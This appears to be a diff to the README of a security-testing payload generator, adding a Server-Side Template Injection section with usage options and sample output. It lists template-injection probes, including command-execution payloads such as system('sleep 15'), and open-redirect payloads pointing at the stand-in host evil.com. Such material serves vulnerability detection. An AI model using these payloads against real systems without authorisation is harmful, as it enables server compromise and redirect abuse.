@@ -2,7 +2,7 @@
 Payload Generator Tool. These payloads are only help to detect the vulnerability. 
 
 - [x] XSS Payload Generation
-- [ ] SSTI Payload Generation
+- [x] SSTI Payload Generation
 - [ ] HTML Injection Payload Generation
 - [x] Open Redirection Payload Generation
 - [ ] SQL Injection Payload Generation
@@ -148,3 +148,54 @@ python3 generator.py ored --oast-domain evil.com --whitelisted-domain github.com
 ////%09/github.com@evil.com
 ```
 
+## Server-Side Template Injection (SSTI)
+
+### Usage
+
+```bash
+usage: generator.py ssti [-h] [--reflective] [--oast] [--timeout] [--oast-domain] [--unique-string] [--sleep-timeout] [--number] [--multiply] [-w] [-l] [--urlencode]
+
+options:
+  -h, --help        show this help message and exit
+
+Service-Side Template Injection Payload Types:
+  --reflective      Generate reflective payloads
+  --oast            Generate OAST payloads
+  --timeout         Generate Time-Based payloads
+
+Service-Side Template Injection Payload Options:
+  --oast-domain     Set OAST Domain for payloads
+  --unique-string   Set Unique String for testing
+  --sleep-timeout   Set Sleep Timeout for payload genrating
+  --number          Set number for payload genrating
+  --multiply        Set string multiply number for payload genrating
+
+SSTI Platform Options:
+  -w, --windows     Generate Windows Based payloads
+  -l, --linux       Generate Linux Based payloads
+
+Server Side Template Injection Payload Mutations:
+  --urlencode       Set URL Encoding for payload generator
+```
+
+
+### Generate Payloads
+
+```bash
+python3 generator.py ssti --timeout --linux                   
+@{@:dML9BHG7cEaAjv3sMyXQ}
+{{7*"dML9BHG7cEaAjv3sMyXQ"}}
+<%=1337*1337%>
+{1337*1337}
+${"1337"+"1337"}
+<%"1337"+"1337"%>
+{system('sleep 15')}
+#{7*"dML9BHG7cEaAjv3sMyXQ"}
+${7*"dML9BHG7cEaAjv3sMyXQ"}
+{"1337"+"1337"}
+{php}sleep 15;{/php}
+{{1337*1337}}
+<%7*"dML9BHG7cEaAjv3sMyXQ"%>
+@{Response.Write("dML9BHG7cEaAjv3sMyXQ");}
+<%1337*1337%>
+```
